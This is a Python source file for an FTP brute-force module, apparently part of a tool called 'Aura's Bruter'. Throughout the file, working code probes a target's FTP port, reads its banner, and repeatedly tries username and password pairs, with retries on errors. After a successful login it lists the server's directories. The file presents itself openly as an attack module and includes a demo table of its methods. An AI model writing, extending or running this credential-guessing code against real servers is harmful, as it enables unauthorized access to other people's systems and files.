#!/usr/bin/env python3
"""
Aura's Bruter - FTP Attack Module
FTP brute force using ftplib (standard library)
"""

import ftplib
import socket
from typing import Optional
from dataclasses import dataclass


@dataclass
class FTPResult:
    """Result of an FTP connection attempt."""
    success: bool
    username: str
    password: str
    error: Optional[str] = None
    welcome: Optional[str] = None


class FTPAttacker:
    """
    FTP brute force attack module using ftplib.
    """
    
    def __init__(
        self,
        host: str,
        port: int = 21,
        timeout: float = 10.0,
        max_retries: int = 3
    ):
        self.host = host
        self.port = port
        self.timeout = timeout
        self.max_retries = max_retries
        self._welcome = None
    
    def check_port_open(self) -> bool:
        """Check if the FTP port is open."""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            result = sock.connect_ex((self.host, self.port))
            sock.close()
            return result == 0
        except Exception:
            return False
    
    def get_welcome(self) -> Optional[str]:
        """Get the FTP server welcome message."""
        if self._welcome:
            return self._welcome
        
        try:
            ftp = ftplib.FTP()
            ftp.connect(self.host, self.port, timeout=self.timeout)
            self._welcome = ftp.getwelcome()
            ftp.quit()
            return self._welcome
        except Exception:
            return None
    
    def try_credentials(self, username: str, password: str) -> FTPResult:
        """
        Try to authenticate with the given credentials.
        
        Args:
            username: FTP username
            password: FTP password
            
        Returns:
            FTPResult with success status and details
        """
        for attempt in range(self.max_retries):
            ftp = ftplib.FTP()
            
            try:
                ftp.connect(self.host, self.port, timeout=self.timeout)
                welcome = ftp.getwelcome()
                
                ftp.login(username, password)
                
                # Success!
                ftp.quit()
                return FTPResult(
                    success=True,
                    username=username,
                    password=password,
                    welcome=welcome
                )
                
            except ftplib.error_perm as e:
                error_msg = str(e)
                # 530 = Login incorrect
                if "530" in error_msg:
                    return FTPResult(
                        success=False,
                        username=username,
                        password=password,
                        error="Authentication failed"
                    )
                # Other permission errors
                return FTPResult(
                    success=False,
                    username=username,
                    password=password,
                    error=f"FTP error: {error_msg}"
                )
                
            except ftplib.error_temp as e:
                # Temporary error, might retry
                if attempt < self.max_retries - 1:
                    continue
                return FTPResult(
                    success=False,
                    username=username,
                    password=password,
                    error=f"Temporary error: {e}"
                )
                
            except socket.timeout:
                if attempt < self.max_retries - 1:
                    continue
                return FTPResult(
                    success=False,
                    username=username,
                    password=password,
                    error="Connection timeout"
                )
                
            except socket.error as e:
                if attempt < self.max_retries - 1:
                    continue
                return FTPResult(
                    success=False,
                    username=username,
                    password=password,
                    error=f"Socket error: {e}"
                )
                
            except Exception as e:
                return FTPResult(
                    success=False,
                    username=username,
                    password=password,
                    error=f"Unexpected error: {e}"
                )
            
            finally:
                try:
                    ftp.quit()
                except Exception:
                    pass
        
        return FTPResult(
            success=False,
            username=username,
            password=password,
            error="Max retries exceeded"
        )
    
    def list_directory(self, username: str, password: str, path: str = "/") -> Optional[list]:
        """
        List directory contents after successful authentication.
        
        Returns:
            List of files/directories or None if failed
        """
        try:
            ftp = ftplib.FTP()
            ftp.connect(self.host, self.port, timeout=self.timeout)
            ftp.login(username, password)
            
            files = ftp.nlst(path)
            ftp.quit()
            return files
            
        except Exception:
            return None
    
    def get_server_info(self) -> dict:
        """Get information about the FTP server."""
        return {
            "host": self.host,
            "port": self.port,
            "welcome": self.get_welcome(),
            "port_open": self.check_port_open()
        }


if __name__ == "__main__":
    from rich.console import Console
    from rich.table import Table
    
    console = Console()
    
    console.print("[yellow]FTP Attack Module - Demo Mode[/yellow]")
    
    table = Table(title="FTPAttacker Methods")
    table.add_column("Method", style="cyan")
    table.add_column("Description", style="white")
    
    table.add_row("check_port_open()", "Check if FTP port is accessible")
    table.add_row("get_welcome()", "Retrieve FTP server welcome message")
    table.add_row("try_credentials(user, pass)", "Attempt authentication")
    table.add_row("list_directory(user, pass, path)", "List directory after auth")
    table.add_row("get_server_info()", "Get comprehensive server info")
    
    console.print(table)
